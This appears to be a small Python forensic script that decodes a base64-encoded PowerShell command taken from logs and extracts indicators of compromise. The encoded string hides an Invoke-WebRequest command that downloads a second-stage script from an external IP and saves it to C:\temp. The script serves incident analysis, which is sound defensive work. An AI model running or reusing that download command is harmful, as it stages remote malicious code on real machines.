#!/usr/bin/env python3
import base64
import re

def decode_powershell(encoded_cmd):
    try:
        decoded = base64.b64decode(encoded_cmd).decode('utf-16le')
        return decoded
    except:
        return "Failed to decode"

# Sample encoded command from logs
encoded_cmd = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANQAvAHMAYwByAGkAcAB0AC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAdABlAG0AcABcAHMAdABhAGcAZQAyAC4AcABzADEAIgA="

decoded = decode_powershell(encoded_cmd)
print("POWERSHELL FORENSIC ANALYSIS")
print("=" * 40)
print(f"Encoded Command: {encoded_cmd[:50]}...")
print(f"Decoded Command: {decoded}")

# Analyze the decoded command
if "Invoke-WebRequest" in decoded:
    print("\nTHREAT INDICATORS:")
    print("- Downloads file from external server")
    print("- Saves to C:\\temp\\ directory")
    print("- Likely second-stage payload")
    
    # Extract IOCs
    urls = re.findall(r'https?://[^\s"]+', decoded)
    files = re.findall(r'C:\\[^\s"]+', decoded)
    
    print(f"\nIOCs EXTRACTED:")
    print(f"URLs: {urls}")
    print(f"File Paths: {files}")
